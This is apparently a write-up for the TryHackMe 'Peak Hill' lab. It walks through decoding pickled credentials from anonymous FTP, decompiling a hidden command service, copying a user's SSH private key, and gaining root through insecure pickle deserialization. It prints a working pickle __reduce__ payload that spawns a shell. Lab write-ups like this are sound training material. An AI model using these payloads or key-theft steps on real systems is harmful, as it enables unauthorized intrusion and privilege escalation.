# Peak Hill

**Room link:** https://tryhackme.com/room/peakhill

Python-oriented room about serialization (the title refers to the `pickle` module) and insecure deserialization.

1. `nmap` reveals FTP (with `anonymous` login allowed) and SSH services on standard ports as well as an unknown TCP service on port 7321.

2. The FTP directory (`anonymous` access) contains a hidden `.creds` file containing a single line of 7048 `0`/`1` chars. Once converted to ASCII, it reveals a `pickle`-serialized list of couples that can be used to retrieve a login (`gherkin`) and password. The following Python script deals with that.

```python
import pickle

In = open('.creds', 'r').read()
Obj = pickle.loads(bytes(int(In[i:i+8], 2) for i in range(0, len(In), 8)))
User = []
Pass = []
for k,c in Obj:
    if k.startswith('ssh_user'):
        User.append((int(k[8:]), c))
    else:
        assert k.startswith('ssh_pass')
        Pass.append((int(k[8:]), c))
User.sort()
User = ''.join(c for _,c in User)
Pass.sort()
Pass = ''.join(c for _,c in Pass)
print(User, Pass)
```

3. These credentials allow to log in as `gherkin` on the target through SSH. In the home directory, we find a Python compiled module `cmd_service.pyc` that does not correspond to the version of Python installed on the target:

```
gherkin@ubuntu-xenial:~$ ls -a
.  ..  .cache  cmd_service.pyc
gherkin@ubuntu-xenial:~$ python3 cmd_service.pyc
RuntimeError: Bad magic number in .pyc file
gherkin@ubuntu-xenial:~$ python3 --version
Python 3.5.2
gherkin@ubuntu-xenial:~$ hd cmd_service.pyc | head -1
00000000  55 0d 0d 0a 00 00 00 00  04 86 bd 5e 5c 08 00 00  |U..........^\...|
```

The magic number corresponds to the first 4 bytes of the `.pyc` file and depends on the version of the `marshal` module that was used when compiling. Here it is `550d0d0a` and corresponds to the current versions of Python (~3.8).

4. We bring back `cmd_service.pyc` to our local machine (with `scp`) and decompile it using `uncompyle6` (installed through `pip`).

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.18 (default, Aug 24 2020, 19:12:23) 
# [GCC 10.2.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 19:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(**REDACTED**)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive('Username: ').strip()
        password_input = self.receive('Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send('Wrong credentials!')
            return None
        self.send('Successfully logged in!')
        while True:
            command = self.receive('Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + '\n'
        self.request.sendall(string)

    def receive(self, prompt='> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
# okay decompiling cmd_service.pyc
```

It is a handmade command line service with hardcoded `username` (`dill`), `password` and `port = 7321`.

These credentials do not allow us to log in as `dill` through SSH though.

5. Back on the target, we see that `dill` is currently running this service (this is the mysterious service of step 1).
```
gherkin@ubuntu-xenial:~$ ps -ef | grep cmd_service
dill      1084     1  0 04:06 ?        00:00:01 /usr/bin/python3 /var/cmd/.cmd_service.py
```

6. We connect to the service and get a cheap command line run as `dill`:

```
$ nc $TARGET_IP 7321
Username: dill
Password: **REDACTED**
Successfully logged in!
Cmd: pwd
/var/cmd

Cmd: ls -a /home/dill
.
..
.bash_history
.bashrc
.cache
.nano
.ssh
user.txt

Cmd: cat /home/dill/user.txt
**REDACTED**
```

We have reached the **user flag**!

7. This access being very limited (not interactive, stuck in `/var/cmd`, ...) we use it to copy `/home/dill/.ssh/id_rsa` to `/tmp` (for instance) and use `gherkin` to bring it back to the local machine (with `scp`) and finally properly log in as `dill` through SSH.

```
$ ssh -i id_rsa dill@$TARGET_IP
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$ ls -la /opt/peak_hill_farm/
total 11404
drwxr-xr-x 2 root root    4096 May 15  2020 .
drwxr-xr-x 3 root root    4096 May 20  2020 ..
-rwxr-x--- 1 root root  788413 May 15  2020 base_library.zip
-rwxr-x--- 1 root root   22000 Apr 17  2020 _bz2.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  149880 Apr 17  2020 _codecs_cn.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  158104 Apr 17  2020 _codecs_hk.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   31128 Apr 17  2020 _codecs_iso2022.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  268664 Apr 17  2020 _codecs_jp.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  137592 Apr 17  2020 _codecs_kr.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  113016 Apr 17  2020 _codecs_tw.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  156624 Apr 17  2020 _ctypes.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   29488 Apr 17  2020 _hashlib.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   66800 Jul  4  2019 libbz2.so.1.0
-rwxr-x--- 1 root root 2365952 Feb 27  2019 libcrypto.so.1.0.0
-rwxr-x--- 1 root root  166032 Sep 12  2019 libexpat.so.1
-rwxr-x--- 1 root root  137400 Feb 12  2014 liblzma.so.5
-rwxr-x--- 1 root root 4547880 Apr 17  2020 libpython3.5m.so.1.0
-rwxr-x--- 1 root root  282392 Feb  4  2016 libreadline.so.6
-rwxr-x--- 1 root root  428384 Feb 27  2019 libssl.so.1.0.0
-rwxr-x--- 1 root root  167240 Feb 19  2016 libtinfo.so.5
-rwxr-x--- 1 root root  104864 Jan 21  2020 libz.so.1
-rwxr-x--- 1 root root   37616 Apr 17  2020 _lzma.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   44144 Apr 17  2020 _multibytecodec.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root    6504 Apr 17  2020 _opcode.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--x 1 root root 1218056 May 15  2020 peak_hill_farm
-rwxr-x--- 1 root root   31688 Apr 17  2020 readline.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   15432 Apr 17  2020 resource.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  118744 Apr 17  2020 _ssl.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root   25032 Apr 17  2020 termios.cpython-35m-x86_64-linux-gnu.so
```

8. So we have the right to run `/opt/peak_hill_farm/peak_hill_farm` as `root` but we cannot read anything about it...

```
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: hello
failed to decode base64
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: aGVsbG8=
this not grow did not grow on the Peak Hill Farm! :(
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: Z3Jvd19mZnM=
Traceback (most recent call last):
  File "peak_hill_farm.py", line 18, in <module>
ValueError: invalid literal for int() with base 10: 'row_ffs'
[1817] Failed to execute script peak_hill_farm
```

At this point, we can guess that it is probably trying to deserialize the base64-encoded data we give as input. Let us verify this hypothesis:

```
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm 
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gASVOwAAAAAAAABdlChLBYwEdGVzdJSMCGJ1aWx0aW5zlIwHY29tcGxleJSTlEdAAAAAAAAAAEdACAAAAAAAAIaUUpRlLg==
This grew to: 
[5, 'test', (2+3j)]
```

This is of course terribly unsafe!

9. The following code (recycled from [OWASP Top 10 room](https://tryhackme.com/room/owasptop10)) builds a poisoned input to spawn a shell as `root`:

```python
import pickle, base64

command = '/bin/bash'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

Let us inject it:

```
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: **REDACTED**
root@ubuntu-xenial:~# cd /root
root@ubuntu-xenial:/root# ls -la
total 28
drwx------  4 root root 4096 May 18  2020 .
drwxr-xr-x 25 root root 4096 Jan  1 04:05 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 May 18  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--r-----  1 root root   33 May 15  2020  root.txt 
drwx------  2 root root 4096 May 15  2020 .ssh
```

10. For some reason, the `?root.txt?` filename starts and ends with unusual whitespace unicode characters ([UTF-8 e28080](https://www.fileformat.info/info/unicode/char/2000/index.htm)), but whatever, time to get the **root flag**!

```
root@ubuntu-xenial:/root# ls | hd
00000000  e2 80 80 72 6f 6f 74 2e  74 78 74 e2 80 80 0a     |...root.txt....|
root@ubuntu-xenial:/root# ls | xargs cat
**REDACTED**
```

Or, alternatively (character codes in octal):

```
root@ubuntu-xenial:/root# LC_ALL=C ls -b
\342\200\200root.txt\342\200\200
root@ubuntu-xenial:/root# cat $(printf '\342\200\200root.txt\342\200\200')
**REDACTED**
```
